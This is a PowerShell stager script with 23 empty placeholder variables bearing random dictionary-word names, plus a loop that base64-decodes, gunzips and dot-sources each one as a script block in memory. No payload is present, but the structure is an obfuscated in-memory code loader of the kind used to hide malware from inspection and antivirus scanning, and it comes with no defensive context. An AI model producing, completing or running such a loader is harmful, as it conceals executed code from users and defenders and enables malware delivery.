#Requires -Version 2

$Betterment = ""
$Osteopaths = ""
$Borderland = ""
$Concubines = ""
$Segregated = ""
$Overtaking = ""
$Westerlies = ""
$Brutalizes = ""
$Monologues = ""
$Alexandria = ""
$Subversion = ""
$Simplified = ""
$Purposeful = ""
$Kentuckian = ""
$Mezzanines = ""
$Recommence = ""
$Extirpated = ""
$Catatonics = ""
$Nonplusses = ""
$Mortgagees = ""
$Noticeably = ""
$Casablanca = ""
$Handicraft = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Betterment,$Osteopaths,$Borderland,$Concubines,$Segregated,$Overtaking,$Westerlies,$Brutalizes,$Monologues,$Alexandria,$Subversion,$Simplified,$Purposeful,$Kentuckian,$Mezzanines,$Recommence,$Extirpated,$Catatonics,$Nonplusses,$Mortgagees,$Noticeably,$Casablanca,$Handicraft)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    $Decompressed = ConvertFrom-Gzip -Bytes $Decoded
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decompressed)
    . $ScriptBlock
}
